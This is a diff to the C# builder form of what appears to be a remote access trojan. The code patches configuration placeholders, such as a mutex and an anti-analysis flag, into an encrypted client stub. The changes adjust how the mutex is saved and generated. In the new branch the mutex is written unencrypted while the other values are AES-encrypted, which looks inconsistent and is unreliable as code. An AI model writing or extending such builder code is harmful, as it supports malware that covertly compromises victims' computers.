@@ -95,7 +95,8 @@ namespace Server.Forms
             }
             catch { }
 
-            txtMutex.Text = getRandomCharacters();
+            if (Properties.Settings.Default.Mutex.Length == 0)
+                txtMutex.Text = getRandomCharacters();
         }
 
 
@@ -184,8 +185,6 @@ namespace Server.Forms
                 if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                 if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
             }
-
-            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = getRandomCharacters();
 
             if (string.IsNullOrWhiteSpace(txtGroup.Text)) txtGroup.Text = "Default";
 
@@ -371,7 +370,7 @@ namespace Server.Forms
                 {
                     asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                     asmDef.Name = Path.GetFileName(AsmName);
-                     if (type.Name == "Settings")
+                    if (type.Name == "Settings")
                         foreach (MethodDef method in type.Methods)
                         {
                             if (method.Body == null) continue;
@@ -430,7 +429,10 @@ namespace Server.Forms
                                         method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
+                                        if (string.IsNullOrWhiteSpace(txtMutex.Text))
+                                            method.Body.Instructions[i].Operand = getRandomCharacters();
+                                        else
+                                            method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
 
                                     if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
                                         method.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());
